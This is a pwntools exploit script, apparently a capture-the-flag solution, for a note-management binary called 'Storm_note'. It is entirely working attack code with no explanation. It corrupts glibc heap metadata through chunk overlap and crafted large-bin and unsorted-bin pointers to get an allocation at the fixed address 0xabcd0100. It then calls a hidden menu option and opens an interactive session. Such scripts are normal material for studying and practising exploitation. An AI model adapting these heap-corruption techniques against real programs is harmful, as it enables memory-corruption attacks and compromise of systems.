from pwn import *
context.log_level = "debug"
p = process("./Storm_note")
elf = ELF("./Storm_note")
libc = elf.libc

cmd = lambda c : p.sendlineafter("Choice: " , str(c))
def add(size):
	cmd(1)
	p.sendlineafter("size ?\n" , str(size))

def edit(idx , content):
	cmd(2)
	p.sendlineafter("Index ?\n" , str(idx))
	p.sendafter("Content:" , content)

def free(idx):
	cmd(3)
	p.sendlineafter("Index ?\n" , str(idx))



add(0x18) # 0
add(0x920) # 1
add(0x18) # 2
add(0x18) # 3
# set fake prev_size
edit(1 , "a" * 0x8f0 + p64(0x900))
# edit(4 , "a" * 0x4f0 + p64(0x500))
# shrink
free(1)
edit(0 , "a" * 0x18) 
add(0x18) # 1 # 0x20 
add(0x418) # large_bin # 0x420 # 4
add(0x18) # 5
add(0x428) # unsorted # 0x430 # 6
add(0x18) # 7
add(0x48) # 8
free(1) 
free(2)
add(0x948) # 1
payload = "a" * 0x10
payload += p64(0) + p64(0x421) + "a" * 0x410 # large bin 
payload += p64(0x420) + p64(0x21) + "a" * 0x10 
payload += p64(0x20) + p64(0x431) + "a" * 0x420 # unsorted bin
payload += p64(0x430) + p64(0x21) + "a" * 0x10
payload += p64(0x20) + p64(0x51)
edit(1 , payload)

free(4) 
add(0x500) # 2
free(6)
storage = 0xabcd0100
fake_chunk = storage - 0x10

payload = "a" * 0x10
payload += p64(0) + p64(0x421) 
payload += p64(0xdeadbeef) + p64(fake_chunk - 0x10 + 3) # fd # bk 
payload += p64(0xdeadbeef) + p64(fake_chunk - 8)  # fd_nextsize # bk_nextsize
payload += "a" * (0x410 - 0x20) # large bin 
payload += p64(0x420) + p64(0x20) + "a" * 0x10 
payload += p64(0x420) + p64(0x431) 
payload += p64(0xdeadbeef) + p64(fake_chunk) # fd # bk
payload += "a" * (0x420 - 0x10) # unsorted bin
payload += p64(0x430) + p64(0x20) + "a" * 0x10
payload += p64(0x20) + p64(0x51)
edit(1 , payload)
add(0x48) # 4
# gdb.attach(p)
# pause()
edit(4 , "a" * 0x30)
cmd(666)
p.send("a" * 0x30)

p.interactive()
